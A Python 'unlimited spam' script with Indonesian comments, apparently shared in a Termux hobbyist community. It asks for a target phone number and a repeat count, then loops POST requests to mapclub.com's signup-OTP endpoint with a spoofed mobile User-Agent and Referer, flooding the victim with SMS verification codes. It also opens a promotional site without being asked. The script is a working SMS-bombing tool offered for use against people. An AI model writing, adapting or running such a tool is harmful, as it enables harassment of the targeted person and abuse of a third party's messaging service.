#mau ngapain bro ? recode ? Usaha dong banyak tutor di youtube tu manfaatin
#jangan recode terus dosa
import os, sys, time, requests
from requests import post

os.system('clear')
time.sleep(3)
print (" JANGAN LUPA KUNJUNGI WWW.IDMASTERTERMUX.TK" )
time.sleep(1)
print (" DAN KUNJUNGI CHANNEL YOUTUBE MASTER TERMUX INDONESIA ")
time.sleep(1)
os.system('xdg-open https://www.idmastertermux.tk')
time.sleep(1)
print (" LOADING...")
time.sleep(5)
os.system('clear')

print('''
 \033[1;31m__  __           _
\033[1;31m|  \/  | __ _ ___| |_ ___ _ __
\033[1;31m| |\/| |/ _` / __| __/ _ \ '__|
\033[1;37m| |  | | (_| \__ \ ||  __/ |
\033[1;37m|_|  |_|\__,_|___/\__\___|_|
\033[1;30mU \033[1;31mN \033[1;32mL \033[1;33mI \033[1;34mM \033[1;34mI \033[1;35mT \033[1;36mE \033[1;37mD  S P A M
Create by Rianto
''')

def lagi():
        l = input('Spam lagi ? y/n: ')
        if l == 'y':
                main()
        elif l == 'n':
                sys.exit()
def main ():
         no = input('target: ')
         jml = int(input('jumlah: '))
         time.sleep(2)
         print('')
         print('')
         print('results:')

         ua = {
         'Connection': 'keep-alive',
         'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; vivo Y21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36',
         'Referer': 'https://www.mapclub.com/en/user/signup',
         }

         dat = {
         'phone': no,
         }

         for x in range(jml):
                 time.sleep(5)
                 sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
                 sendSms.json()
                 if 'error' in sendSms.text:
                         print('Spam '+ str(no) + ' [ gagal ]')
                 else:
                         print('Spam '+ str(no) + ' [ berhasil ]')

main()
lagi()
